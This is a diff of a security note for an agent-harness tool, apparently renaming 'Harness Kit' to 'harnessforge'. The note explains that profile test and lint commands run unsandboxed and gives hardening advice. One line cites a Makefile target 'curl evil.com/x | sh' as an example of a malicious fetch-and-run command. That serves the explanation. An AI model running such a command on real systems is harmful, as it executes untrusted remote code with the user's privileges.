@@ -2,7 +2,7 @@
 
 > **Read this before pulling a `harness.config.json` or `.harness/profile.yaml` from an untrusted source.**
 
-Harness Kit is designed around the principle that **the profile is code**. It's not a static configuration — it's a description of what shell commands the agent (and `harness verify`) should run on your behalf.
+harnessforge is designed around the principle that **the profile is code**. It's not a static configuration — it's a description of what shell commands the agent (and `harness verify`) should run on your behalf.
 
 ## What `harness verify` actually does
 
@@ -13,7 +13,7 @@ Harness Kit is designed around the principle that **the profile is code**. It's 
 
 These commands run with **your current shell's privileges** in the directory you're in. There is no sandbox around them — they are the project's declared tooling.
 
-This is the same trust model as `npm test`, `make test`, `cargo test`, or any other CI command runner: if a stranger sends you a `Makefile` with `test:` set to `curl evil.com/x | sh`, running `make test` runs the malicious script. Harness Kit is no different.
+This is the same trust model as `npm test`, `make test`, `cargo test`, or any other CI command runner: if a stranger sends you a `Makefile` with `test:` set to `curl evil.com/x | sh`, running `make test` runs the malicious script. harnessforge is no different.
 
 ## What this means in practice
 
@@ -23,7 +23,7 @@ This is the same trust model as `npm test`, `make test`, `cargo test`, or any ot
 
 ## What `harness` does NOT execute as user code
 
-The following are **never** invoked as shell commands by Harness Kit itself:
+The following are **never** invoked as shell commands by harnessforge itself:
 
 - `forbidden_paths` / `forbidden_commands` / `requires_human_approval` — these are descriptive lists the agent reads, not shell input
 - `recommended_mcps` — names only; you have to wire each MCP into your client yourself
@@ -34,12 +34,12 @@ The following are **never** invoked as shell commands by Harness Kit itself:
 
 ## What `harness verify` does for blueprint-shipped validators
 
-Validator modules (e.g. `harness/blueprints/python-cli-app/validators/check_tests.py`) are shipped *inside the harness-kit package itself*, not in the user's repo. They're loaded via `importlib.util.spec_from_file_location` and run inside `aegis.synthesize.sandbox` (AST allowlist + restricted exec + SIGALRM/RLIMIT).
+Validator modules (e.g. `harness/blueprints/python-cli-app/validators/check_tests.py`) are shipped *inside the harnessforge package itself*, not in the user's repo. They're loaded via `importlib.util.spec_from_file_location` and run inside `aegis.synthesize.sandbox` (AST allowlist + restricted exec + SIGALRM/RLIMIT).
 
 So the chain is:
 
 1. **The user's `profile.yaml`** is data — never executed except for `test_command` / `lint_command` strings that `check_tests` / `check_lint` shell out to.
-2. **Blueprint validators** are package code, not user code — same trust level as harness-kit itself.
+2. **Blueprint validators** are package code, not user code — same trust level as harnessforge itself.
 3. **`test_command` and `lint_command`** are the *only* attack surface, and they have the same trust model as `npm test` / `make test`.
 
 ## When to be paranoid
@@ -55,7 +55,7 @@ If your workflow includes any of:
 ## Hardening recommendations
 
 - **For repos accepting external contributions**: run `harness verify` in a sandboxed CI runner (GitHub Actions ephemeral runner is fine; Docker container is better).
-- **For CI**: pin the harness-kit version in your `requirements.txt` / `pyproject.toml` so a supply-chain compromise of a future harness-kit version doesn't auto-apply to your CI runs.
+- **For CI**: pin the harnessforge version in your `requirements.txt` / `pyproject.toml` so a supply-chain compromise of a future harnessforge version doesn't auto-apply to your CI runs.
 - **For shared profiles**: if you ship a "blessed" `profile.yaml` template, sign the commit that introduces it. Future drift in `test_command` is then visible in `git log`.
 
 ## What we are NOT doing
